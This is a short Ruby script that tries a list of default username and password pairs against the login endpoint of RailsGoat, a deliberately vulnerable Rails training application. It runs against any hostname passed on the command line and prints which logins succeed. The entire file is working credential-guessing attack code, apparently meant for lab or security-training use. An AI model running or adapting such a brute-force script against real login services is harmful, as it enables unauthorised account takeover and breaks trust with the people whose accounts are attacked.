#!/usr/bin/ruby
require 'net/http'

usernames=["ec2-user","admin","username","johntheripper","master","hacker","admin@metacorp.com"]
passwords=["ec2-user","admin","password","johntheripper","master","letmein","admin1234"]
# Attempt brute force Railsgoat user sign in #

ARGV.each do |hostname|
  usernames.each_with_index do |username, index|
    password = passwords[index]
    port = 8080
    time_out_limit = 1

    begin
      uri = URI("http://#{hostname}:#{port}/sessions")
      req = Net::HTTP::Post.new(uri)
      req.set_form_data('email' => username, 'password' => password, 'commit' => 'Login')
      http = Net::HTTP.new(uri.hostname, uri.port)
      http.open_timeout = time_out_limit
      http.read_timeout = time_out_limit
      res = http.request(req)

      case res
      when Net::HTTPSuccess then
        if res.body.include?("Incorrect Password") || res.body.include?("doesn't exist!")
          puts "FAIL: Railsgoat Login Failed"
        end
      when Net::HTTPRedirection then
        location = res['location']
        if location.include?("/dashboard/home")
          puts "SUCCESS: Railsgoat Login Success! Redirected to #{location}"
        else
          puts "FAIL: Redirected to #{location}"
        end
      else
        puts "FAIL: No Railsgoat server"
      end
    rescue Errno::ECONNREFUSED
      puts "Could not connect to #{uri}"
      break
    rescue Net::OpenTimeout
     puts "FAIL: TIMED OUT after #{time_out_limit} seconds. No Railsgoat server"
     break
    end
  end
end
